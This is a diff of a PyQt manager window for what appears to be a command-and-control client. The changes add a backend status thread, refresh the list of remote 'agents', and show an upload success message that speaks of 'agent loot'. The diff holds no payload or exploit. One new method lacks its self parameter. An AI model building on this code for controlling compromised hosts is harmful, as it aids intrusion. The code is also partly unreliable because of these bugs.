@@ -51,6 +51,7 @@ class Manager(QtWidgets.QMainWindow, design.Ui_MainWindow):
         self.AgentList.currentItemChanged.connect(self.update_info_labels)
         self.InterfaceTable.setModel(self.interfaceModel)
         self.InterfaceTable.show()
+        self.BackendStatus.setText("OK")
 
         self.winList = []
         self.winListIndex = 0
@@ -58,6 +59,10 @@ class Manager(QtWidgets.QMainWindow, design.Ui_MainWindow):
         # Initialize the session and attempt to start a connection
         self.session = session.Session("127.0.0.1")
         self._show_connect_dialogue()
+        self.statusThread = misc.BackendUpdater(self.session, self)
+        self.statusThread.update_sig_ok.connect(self.update_agents)
+        self.statusThread.update_sig_er.connect(self.update_agents_failed)
+        self.statusThread.start()
 
     def closeEvent(self, evnt):
         print("[ ] Closing window...")
@@ -74,14 +79,23 @@ class Manager(QtWidgets.QMainWindow, design.Ui_MainWindow):
     def _show_connect_dialogue(self):
         """Shows the server connection dialogue and initializes the agent list"""
         self.session = session.Session('127.0.0.1')
-        self.AgentList.clear()
         dialog = dialogues.ConnectDialogue(self.session)
         dialog.exec()
+        self.update_agents()
+        
+    def update_agents_failed():
+        self.BackendStatus.setText("ERROR")
+
+    def update_agents(self):
+        indx = self.AgentList.currentIndex().row()
+        self.AgentList.clear()
         for entry in self.session.agents:
             item = QtWidgets.QListWidgetItem()
             item.setText(entry.id)
             item.setData(QtCore.Qt.UserRole, entry)
             self.AgentList.addItem(item)
+        self.AgentList.setCurrentRow(indx)
+        self.BackendStatus.setText("OK")
 
     def update_info_labels(self):
         """Updates the info labels when a new agent is clicked"""
@@ -121,8 +135,11 @@ class Manager(QtWidgets.QMainWindow, design.Ui_MainWindow):
         file = misc.open_file()
         if file == 0:
             return
-        self.session.upload_file(self.AgentList.currentItem().text(), file)
-
+        ret = self.session.upload_file(self.AgentList.currentItem().text(), file)
+        if ret == 0:
+            reply = QtWidgets.QMessageBox.information(self, "Success!", "Successfully retrieved agent loot")
+            return
+        
     def pull_file(self):
         """Dialogue to pull a file from an agent"""
         if not self.has_selection():
